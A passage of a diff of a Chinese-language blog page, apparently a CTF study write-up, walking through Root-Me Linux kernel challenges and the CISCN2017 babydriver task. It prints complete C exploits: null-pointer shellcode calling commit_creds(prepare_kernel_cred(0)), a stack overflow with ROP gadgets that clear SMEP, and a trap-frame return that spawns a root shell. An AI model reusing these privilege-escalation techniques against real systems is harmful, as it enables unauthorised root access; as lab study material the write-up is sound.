 <h4 id="分析LKMs文件-1"><a href="#分析LKMs文件-1" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>路径由init可知：<code>/lib/modules/*/rootme/*.ko</code></p>
-<p><img src="/2021/06/05/kernel-study/image-20210603220411473.png" alt="image-20210603220411473"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603220411473.png" alt="image-20210603220411473"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=d55b3e2795a90b029627ae2fcc47291702c1784b, not stripped</span><br><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/nullpoint/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
 
 <p>同样给了源码，<code>ch2.c</code></p>
@@ -734,7 +734,7 @@
 <h5 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h5><p>目标是调用<code>commit_creds(prepare_kernel_cred(0))</code>，故可编写如下汇编执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210604144540167.png" alt="image-20210604144540167"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604144540167.png" alt="image-20210604144540167"></p>
 <p>有因为commit_creds和prepare_kernel_cred地址已知</p>
 <blockquote>
 <p>eax是参数？</p>
@@ -750,8 +750,8 @@
 
 <h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>] ; </span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210604174655495.png" alt="image-20210604174655495"></p>
-<h5 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210604144933474.png" alt="image-20210604144933474"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604174655495.png" alt="image-20210604174655495"></p>
+<h5 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/20-29-undefined/image-20210604144933474.png" alt="image-20210604144933474"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80</span><br></pre></td></tr></table></figure>
 
 <h3 id="3-Root-Me-LinKern-x86-basic-ROP"><a href="#3-Root-Me-LinKern-x86-basic-ROP" class="headerlink" title="3.[Root-Me]LinKern x86 - basic ROP"></a>3.[Root-Me]LinKern x86 - basic ROP</h3><h4 id="下载文件-2"><a href="#下载文件-2" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-basic-ROP" target="_blank" rel="noopener">下载地址</a></p>
@@ -772,7 +772,7 @@
 <p>3.调试模块基址</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/ch39.ko 0xc8824000 -s .bss 0xc8824440 -s .data 0xc88241a0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210604203258087.png" alt="image-20210604203258087"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604203258087.png" alt="image-20210604203258087"></p>
 <p>4.启动文件start.sh</p>
 <blockquote>
 <p>根据隐藏文件改编</p>
@@ -781,14 +781,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;basicrop \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
 
 <p>可以看到开启了smep保护，即不能内核态不能执行用户态代码。</p>
-<p><img src="/2021/06/05/kernel-study/image-20210604204333432.png" alt="image-20210604204333432"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604204333432.png" alt="image-20210604204333432"></p>
 <h4 id="分析init文件-1"><a href="#分析init文件-1" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/bof</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
 
 <p>这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</p>
 <h4 id="分析LKMs文件-2"><a href="#分析LKMs文件-2" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ file ch39.ko </span><br><span class="line">ch39.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=c713ac86971c4a5d343a2537a18a950af493c44d, not stripped</span><br><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ checksec ch39.ko </span><br><span class="line">[*] '/home/winter/basicrop/initramfs/lib/modules/4.10.3/rootme/ch39.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
 
 <p>这次没有源码，主要分析ida中的ko文件</p>
-<p><img src="/2021/06/05/kernel-study/image-20210604230215674.png" alt="image-20210604230215674"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604230215674.png" alt="image-20210604230215674"></p>
 <p>主要分析write函数</p>
 <ol>
 <li>判断size不为0</li>
@@ -802,9 +802,9 @@
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210604210532727.png" alt="image-20210604210532727"></p>
-<p><img src="/2021/06/05/kernel-study/image-20210604210519934.png" alt="image-20210604210519934"></p>
-<p><img src="/2021/06/05/kernel-study/image-20210605000529882.png" alt="image-20210605000529882"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604210532727.png" alt="image-20210604210532727"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604210519934.png" alt="image-20210604210519934"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605000529882.png" alt="image-20210605000529882"></p>
 <p>正如我们所想，eip的值为0xdeadbeef然后就挂了。</p>
 <p>可以成功控制eip</p>
 <h5 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h5><p>要绕过smep检验，将cr4的第20位设为0，通过两个gadget实现：</p>
@@ -812,11 +812,11 @@
 
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210605000952674.png" alt="image-20210605000952674"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605000952674.png" alt="image-20210605000952674"></p>
 <p>在test2的c后面加上提权的shellcode，即可得到最后的exp</p>
 <h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    *((<span class="keyword">void</span>**)(Get_shell)) = &amp;payload;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">56</span>;i &lt; <span class="number">4</span>;i++,j++)&#123;</span><br><span class="line">        Payload[j] = Get_shell[i];<span class="comment">//绕过smep后加上提权和get shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210605001430795.png" alt="image-20210605001430795"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605001430795.png" alt="image-20210605001430795"></p>
 <h3 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h3><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
 <p><a href="babydriver.tar">附件</a></p>
 <p>一共给了三个文件：boot.sh、bzImage和rootfs.cpio</p>
@@ -839,16 +839,16 @@
 <li><p>调试模块基址</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./rootfs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000 -s .bss 0xffffffffc0002000 -s .data 0xffffffffc0002440</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210605202802017.png" alt="image-20210605202802017"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605202802017.png" alt="image-20210605202802017"></p>
 </li>
 <li><p>启动文件start.sh</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
 
 <p>开启了smep保护</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605204630220.png" alt="image-20210605204630220"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605204630220.png" alt="image-20210605204630220"></p>
 </li>
 <li><p>提权地址</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605205107457.png" alt="image-20210605205107457"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605205107457.png" alt="image-20210605205107457"></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1420</span>;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>LKMs文件</p>
@@ -862,15 +862,15 @@
 </blockquote>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
 
-<h5 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h5><p><img src="/2021/06/05/kernel-study/image-20210605210915873.png" alt="image-20210605210915873"></p>
+<h5 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h5><p><img src="/2021/06/05/20-29-undefined/image-20210605210915873.png" alt="image-20210605210915873"></p>
 <p>本题提供了五个函数</p>
 <ol>
 <li><p>open</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605211023321.png" alt="image-20210605211023321"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605211023321.png" alt="image-20210605211023321"></p>
 <p>打开设备时，程序申请一个64字节的chunk给全局变量device_buf，并且将size赋值给device_buf_size</p>
 </li>
 <li><p>write</p>
-<p><img src="/2021/06/05/kernel-study/image-20210605211737963.png" alt="image-20210605211737963"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210605211737963.png" alt="image-20210605211737963"></p>
 <ol>
 <li>首先看device_buf是否分配了chunk，device_buf_len&gt;要写入的长度</li>
